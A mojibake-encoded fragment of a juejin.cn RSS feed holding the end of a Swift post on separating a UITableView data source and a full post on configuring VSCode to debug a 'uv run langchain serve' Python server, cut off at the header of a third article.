<p>æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªç‹¬ç«‹çš„æ•°æ®æºå¯¹è±¡ï¼Œç”¨äºé©±åŠ¨èœå•å‹UITableViewï¼Œè®©åè®©ä»–å»æ”¯æŒUITableViewDataSourceå’ŒUITableViewDelegateä¸¤ä¸ªåè®®</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> UIKit

<span class="hljs-comment">/// ç‹¬ç«‹çš„æ•°æ®æºå¯¹è±¡ï¼Œç”¨äºé©±åŠ¨èœå•å‹UITableView</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HCMenuTableViewDataSource</span>: <span class="hljs-title class_">NSObject</span> {

Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> menuItems: [<span class="hljs-type">HCMenuItem</span>] <span class="hljs-operator">=</span> []
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> cellIdentifier: <span class="hljs-type">String</span>

Â  Â  <span class="hljs-comment">/// ç”¨æˆ·ç‚¹å‡»èœå•é¡¹æ—¶çš„å›è°ƒ</span>
Â  Â  <span class="hljs-comment">/// - Parameter viewController: å°†è¦è¢« push çš„æ–°è§†å›¾æ§åˆ¶å™¨å®ä¾‹</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> onMenuItemSelected: ((<span class="hljs-type">UIViewController</span>) -&gt; <span class="hljs-type">Void</span>)<span class="hljs-operator">?</span>

Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">cellIdentifier</span>: <span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-string">"HCMenuCell"</span>) {
Â  Â  Â  Â  <span class="hljs-keyword">self</span>.cellIdentifier <span class="hljs-operator">=</span> cellIdentifier
Â  Â  Â  Â  <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>()
Â  Â  }
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">HCMenuTableViewDataSource</span>: <span class="hljs-title class_">UITableViewDataSource</span> {

Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">numberOfRowsInSection</span> <span class="hljs-params">section</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> {
Â  Â  Â  Â  <span class="hljs-keyword">return</span> menuItems.count
Â  Â  }

Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">cellForRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) -&gt; <span class="hljs-type">UITableViewCell</span> {
Â  Â  Â  Â  <span class="hljs-keyword">let</span> cell <span class="hljs-operator">=</span> tableView.dequeueReusableCell(withIdentifier: cellIdentifier, for: indexPath)
Â  Â  Â  Â  <span class="hljs-keyword">let</span> item <span class="hljs-operator">=</span> menuItems[indexPath.row]
Â  Â  Â  Â  cell.textLabel<span class="hljs-operator">?</span>.text <span class="hljs-operator">=</span> item.title
Â  Â  Â  Â  cell.accessoryType <span class="hljs-operator">=</span> .disclosureIndicator
Â  Â  Â  Â  <span class="hljs-keyword">return</span> cell
Â  Â  }
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">HCMenuTableViewDataSource</span>: <span class="hljs-title class_">UITableViewDelegate</span> {
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">didSelectRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) {
Â  Â  Â  Â  <span class="hljs-keyword">let</span> item <span class="hljs-operator">=</span> menuItems[indexPath.row]
Â  Â  Â  Â  <span class="hljs-keyword">let</span> viewController <span class="hljs-operator">=</span> item.viewControllerType.<span class="hljs-keyword">init</span>()
Â  Â  Â  Â  onMenuItemSelected<span class="hljs-operator">?</span>(viewController)
Â  Â  Â  Â  tableView.deselectRow(at: indexPath, animated: <span class="hljs-literal">true</span>)
Â  Â  }
}
</code></pre>
<p>å…·ä½“çš„tableViewControlleråœ¨ä½¿ç”¨æ—¶åšå¦‚ä¸‹é…ç½®</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> UIKit

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HCMenuTableViewController</span>: <span class="hljs-title class_">UITableViewController</span> {

Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> menuItems: [<span class="hljs-type">HCMenuItem</span>] <span class="hljs-operator">=</span> [] {
Â  Â  Â  Â  <span class="hljs-keyword">didSet</span> {
Â  Â  Â  Â  Â  Â  dataSource.menuItems <span class="hljs-operator">=</span> menuItems
Â  Â  Â  Â  Â  Â  tableView.reloadData()
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">lazy</span> <span class="hljs-keyword">var</span> dataSource <span class="hljs-operator">=</span> <span class="hljs-type">HCMenuTableViewDataSource</span>()

Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">viewDidLoad</span>() {
Â  Â  Â  Â  <span class="hljs-keyword">super</span>.viewDidLoad()
Â  Â  Â  Â  setupDataSource()
Â  Â  }
    
Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">setupDataSource</span>() {
Â  Â  Â  Â  <span class="hljs-comment">// æ³¨å†Œé»˜è®¤ cell</span>
Â  Â  Â  Â  tableView.register(<span class="hljs-type">UITableViewCell</span>.<span class="hljs-keyword">self</span>, forCellReuseIdentifier: dataSource.cellIdentifier)
Â  Â  Â  Â  tableView.dataSource <span class="hljs-operator">=</span> dataSource
Â  Â  Â  Â  tableView.delegate <span class="hljs-operator">=</span> dataSource
Â  Â  Â  Â  <span class="hljs-comment">// è®¾ç½®ç‚¹å‡»å›è°ƒ</span>
Â  Â  Â  Â  dataSource.onMenuItemSelected <span class="hljs-operator">=</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] viewController <span class="hljs-keyword">in</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.navigationController<span class="hljs-operator">?</span>.pushViewController(viewController, animated: <span class="hljs-literal">true</span>)
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªç±»å»ç»§æ‰¿HCMenuTableViewControllerï¼Œé‚£ä¹ˆåªéœ€è¦å¦‚ä¸‹é…ç½®</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MenuViewController</span>: <span class="hljs-title class_">HCMenuViewController</span> {

Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">viewDidLoad</span>() {
Â  Â  Â  Â  <span class="hljs-keyword">super</span>.viewDidLoad()
        
Â  Â  Â  Â  menuItems <span class="hljs-operator">=</span> [
Â  Â  Â  Â  Â  Â  <span class="hljs-type">HCMenuItem</span>(title: <span class="hljs-string">"MetalKit_åŸé¡¹ç›®"</span>, vcType: <span class="hljs-type">ColorGridViewController</span>.<span class="hljs-keyword">self</span>),
Â  Â  Â  Â  Â  Â  <span class="hljs-type">HCMenuItem</span>(title: <span class="hljs-string">"Test1"</span>, vcType: <span class="hljs-type">UIViewController</span>.<span class="hljs-keyword">self</span>),
Â  Â  Â  Â  Â  Â  <span class="hljs-type">HCMenuItem</span>(title: <span class="hljs-string">"Test2"</span>, vcType: <span class="hljs-type">UIViewController</span>.<span class="hljs-keyword">self</span>),
Â  Â  Â  Â  Â  Â  <span class="hljs-type">HCMenuItem</span>(title: <span class="hljs-string">"Test3"</span>, vcType: <span class="hljs-type">UIViewController</span>.<span class="hljs-keyword">self</span>),
Â  Â  Â  Â  ]
Â  Â  }
}
</code></pre>
<p>è¿™ç§åˆ†ç¦»æ•°æ®æºçš„æ€è·¯ï¼Œä¼šæ¯”ä¸€å¼€å§‹æŠ½ç¦»å‡ºä¸€ä¸ªprotocolæ›´ä¸ºåˆç†å’Œä¼˜é›…ï¼Œæ¯•ç«Ÿç»“æ„ä½“ä¸­å»åšé»˜è®¤å®ç°ï¼Œæä¾›ä¸€äº›é¢å¤–çš„é»˜è®¤å®ç°æ–¹æ³•ï¼Œæ„Ÿè§‰èµ·æ¥æ€ªæ€ªçš„ã€‚protocolæ›´æ­£ç¡®çš„ç”¨æ³•è¿˜æ˜¯æä¾›å…¶ä»–ç±»å¿…é¡»éµå®ˆçš„å±æ€§å’Œæ–¹æ³•ï¼Œè€Œä¸æ˜¯ç±»ä¼¼ä¸Šé¢çš„åˆ©ç”¨é»˜è®¤å®ç°ç»™å…¶ä»–ç±»æä¾›å…¬ç”¨çš„æ–¹æ³•ã€‚<br/>
è€Œåˆ†ç¦»æ•°æ®æºçš„æ€è·¯ï¼Œå°±çœ‹èµ·æ¥æ­£å¸¸å¾ˆå¤šï¼ŒHCMenuTableViewDataSourceç¬¦åˆå•ä¸€èŒè´£è®¾è®¡æ€è·¯ï¼Œåœ¨åšä»–è¯¥åšçš„äº‹æƒ…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode å¦‚ä½•æ–­ç‚¹è°ƒè¯• uvï¼š`uv run langchain serve` - å‰ç«¯å­¦ FastAPI ç³»åˆ—]]></title>    <link>https://juejin.cn/post/7597619377429561398</link>    <guid>https://juejin.cn/post/7597619377429561398</guid>    <pubDate>2026-01-21T08:50:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597619377429561398" data-draft-id="7587712328826011684" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode å¦‚ä½•æ–­ç‚¹è°ƒè¯• uvï¼š`uv run langchain serve` - å‰ç«¯å­¦ FastAPI ç³»åˆ—"/> <meta itemprop="keywords" content="Python,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-21T08:50:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Legend80s"/> <meta itemprop="url" content="https://juejin.cn/user/2568105753839790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode å¦‚ä½•æ–­ç‚¹è°ƒè¯• uvï¼š`uv run langchain serve` - å‰ç«¯å­¦ FastAPI ç³»åˆ—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2568105753839790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Legend80s
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T08:50:20.000Z" title="Wed Jan 21 2026 08:50:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 align="center" data-id="heading-0">How to debug `uv run ...` python program in VSCode</h2>
<p>æƒ³è¦è°ƒè¯•ä¸‹ FastAPI ä¸­ sqlmodelï¼ˆåº•å±‚æ˜¯ sqlalchemyï¼‰æ˜¯å¦‚ä½•é€šè¿‡ä¸»é”® id è·å–ä¸€ä¸ªæ•°æ®åº“è®°å½•çš„ï¼š</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/heroes/{hero_id}"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_hero</span>(<span class="hljs-params">hero_id: <span class="hljs-built_in">int</span>, session: SessionDep</span>) -&gt; HeroPublic:
    hero = session.get(Hero, hero_id)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> hero:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"Hero not found"</span>)

    <span class="hljs-keyword">return</span> HeroPublic.model_validate(hero)
</code></pre>
<p>ä»Šå¤©å°è¯•äº†å¾ˆä¹…æ‰æˆåŠŸåœ¨ <code>uv run langchain serve</code> è¿è¡Œçš„ python ç¨‹åºä¸­æ‰“æ–­ç‚¹ã€‚å½“ç„¶ Trae ç­‰ VSCode IDE ä¸€å¾‹å¯ç”¨ã€‚</p>
<h3 data-id="heading-1">ğŸ‘©â€ğŸ« æŠ„ä½œä¸š</h3>
<p>.vscode/launch.json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"configurations"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"âœ… `uv run langchain serve` debugger"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"debugpy"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"request"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"launch"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"program"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${workspaceFolder}/.venv/Scripts/langchain.exe"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"serve"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"console"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"integratedTerminal"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"justMyCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"cwd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${workspaceFolder}"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"PYTHONPATH"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${workspaceFolder}"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è¯´æ˜</strong></p>
<ol>
<li>å› ä¸ºæˆ‘ä»¬æƒ³è°ƒè¯•åŒ…æºç ï¼Œæ•… <code>"justMyCode": false</code></li>
<li>langchain ä½ç½®å¦‚ä½•ç¡®å®šï¼Ÿé¦–å…ˆè¿›å…¥é¡¹ç›®æ ¹ç›®å½•ä¸”ç¡®ä¿è™šæ‹Ÿç¯å¢ƒå·²ç»å¯åŠ¨ï¼š</li>
</ol>
<pre><code class="hljs language-sh" lang="sh">â¯ <span class="hljs-built_in">which</span> langchain 
/f/workspace/github/my-app/.venv/Scripts/langchain
</code></pre>
<p>or</p>
<pre><code class="hljs language-sh" lang="sh">â¯ uv run <span class="hljs-built_in">which</span> langchain
/f/workspace/github/my-app/.venv/Scripts/langchain
</code></pre>
<p><strong>æ³¨æ„ Windows éœ€è¦åŠ  <code>.exe</code></strong> <code>"program": "${workspaceFolder}/.venv/Scripts/langchain.exe",</code> å¦åˆ™æŠ¥é”™ï¼š</p>
<p><strong>FileNotFoundError: [Errno 2] No such file or directory: 'F:\workspace\github\my-app\.venv\Scripts\langchain'</strong></p>
<h3 data-id="heading-2">ğŸ å¼€å¯è°ƒè¯•</h3>
<p>å·² Trae ä¸ºä¾‹ï¼šæ‰“æ–­ç‚¹ â†’ ç„¶åç‚¹å‡»å·¦ä¾§ Bug å°è™«å­ ğŸ æ ‡å¿— â†’ ä¸‹æ‹‰æ¡†é€‰æ‹© <strong>âœ… <code>uv run langchain serve</code> debugger</strong> â†’ ç‚¹å‡»å³ä¾§ç»¿è‰²å°è™«å­ï¼ˆStart Debuggingï¼‰æˆ–ç›´æ¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mn>5</mn></mrow><annotation encoding="application/x-tex">F5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">5</span></span></span></span></span> å¼€å¯è°ƒè¯•ï¼Œæ—¥å¿—å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">â¯  cd <span class="hljs-attr">F</span>:\\workspace\\github\\my-app ; <span class="hljs-regexp">/usr/</span>bin/env <span class="hljs-attr">f</span>:\\workspace\\github\\my-app\\.<span class="hljs-property">venv</span>\\<span class="hljs-title class_">Scripts</span>\\python.<span class="hljs-property">exe</span> <span class="hljs-attr">c</span>:\\<span class="hljs-title class_">Users</span>\\liuchuanzong\\.<span class="hljs-property">trae</span>-cn\\extensions\\ms-python.<span class="hljs-property">debugpy</span>-<span class="hljs-number">2025.18</span><span class="hljs-number">.0</span>-win32-x64\\bundled\\libs\\debugpy\\launcher <span class="hljs-number">54274</span> -- <span class="hljs-attr">F</span>:\\workspace\\github\\my-app/.<span class="hljs-property">venv</span>/<span class="hljs-title class_">Scripts</span>/langchain.<span class="hljs-property">exe</span> serve
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Will</span> watch <span class="hljs-keyword">for</span> changes <span class="hljs-keyword">in</span> these <span class="hljs-attr">directories</span>: [<span class="hljs-string">'F:\\workspace\\github\\my-app'</span>]
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Uvicorn</span> running on <span class="hljs-attr">http</span>:<span class="hljs-comment">//127.0.0.1:8000 (Press CTRL+C to quit)</span>
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Started</span> reloader process [<span class="hljs-number">18892</span>] using <span class="hljs-title class_">StatReload</span>
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Started</span> server process [<span class="hljs-number">16184</span>]
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Waiting</span> <span class="hljs-keyword">for</span> application startup.
<span class="hljs-attr">INFO</span>:     <span class="hljs-title class_">Application</span> startup complete.
</code></pre>
<p>è§¦å‘</p>
<pre><code class="hljs language-ts" lang="ts">â¯ curl -s <span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:8000/heroes/1 | jq</span>

{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"legend80s"</span>,
  <span class="hljs-string">"age"</span>: <span class="hljs-literal">null</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¨‹åºæ–­åœ¨äº†æˆ‘ä»¬åˆšåˆšæ‰“çš„æ–­ç‚¹å¤„ã€‚</p>
<h3 data-id="heading-3">ğŸ’­ æ„Ÿæƒ³</h3>
<p>è¿˜æ˜¯ DeepSeek å¸®æˆ‘è§£å†³äº†é—®é¢˜ï¼ŒKimi 2 èƒ¡è¯´å…«é“ï¼Œç¤¾åŒºæ–¹æ¡ˆå¹¶ä¸å¯ä¿¡ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fastral-sh%2Fuv%2Fissues%2F8558" target="_blank" title="https://github.com/astral-sh/uv/issues/8558" ref="nofollow noopener noreferrer">uv å®˜æ–¹è¿™ä¸ª issue Running uv scripts in debug mode #8558</a> ä¸€ç›´æ˜¯ openï¼Œè¿˜åœ¨ç­‰ç€ VSCode å®˜æ–¹è§£å†³ ğŸ’ğŸ ğŸŒã€‚</p>
<blockquote>
<p>æ›´å¤šæœ‰ç”¨æ–‡ç« è¯·å…³æ³¨ã€Œ<strong><code>JavaScriptä¸ç¼–ç¨‹è‰ºæœ¯</code></strong>ã€ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´]]></title>    <link>https://juejin.cn/post/7597623395907846190</link>    <guid>https://juejin.cn/post/7597623395907846190</guid>    <pubDate>2026-01-21T11:50:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623395907846190" data-draft-id="7597379486428659738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:50:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:50:27.000Z" title="Wed Jan 21 2026 11:50:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
